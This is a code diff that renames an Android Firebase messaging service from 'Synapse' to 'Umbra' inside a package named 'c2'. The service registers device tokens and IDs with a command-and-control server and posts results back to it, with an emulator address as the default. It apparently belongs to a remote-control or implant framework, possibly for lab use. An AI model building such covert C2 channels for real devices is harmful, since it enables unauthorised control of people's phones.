@@ -1,9 +1,9 @@
-package org.synapse.core.c2
+package org.umbra.core.c2
 
 import android.util.Log
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
-import org.synapse.core.core.CryptoEngine
+import org.umbra.core.core.CryptoEngine
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -13,10 +13,10 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.util.concurrent.TimeUnit
 
-class SynapseFcmService : FirebaseMessagingService() {
+class UmbraFcmService : FirebaseMessagingService() {
 
     companion object {
-        private const val TAG = "Synapse.FCM"
+        private const val TAG = "Umbra.FCM"
         private const val C2_REGISTER_PATH = "/api/register-fcm"
         private const val C2_RESULT_PATH = "/api/result"
     }
@@ -31,7 +31,7 @@ class SynapseFcmService : FirebaseMessagingService() {
         Log.d(TAG, "New FCM token: ${token.take(20)}...")
         C2Coordinator.updateFcmToken(token)
 
-        val prefs = getSharedPreferences("synapse_prefs", MODE_PRIVATE)
+        val prefs = getSharedPreferences("umbra_prefs", MODE_PRIVATE)
         val deviceId = prefs.getString("device_id", "unknown") ?: "unknown"
 
         CoroutineScope(Dispatchers.IO).launch {
@@ -80,7 +80,7 @@ class SynapseFcmService : FirebaseMessagingService() {
     }
 
     private fun getC2Base(): String {
-        val prefs = getSharedPreferences("synapse_prefs", MODE_PRIVATE)
+        val prefs = getSharedPreferences("umbra_prefs", MODE_PRIVATE)
         return prefs.getString("c2_base_url", "https://10.0.2.2:8443") ?: "https://10.0.2.2:8443"
     }
 }
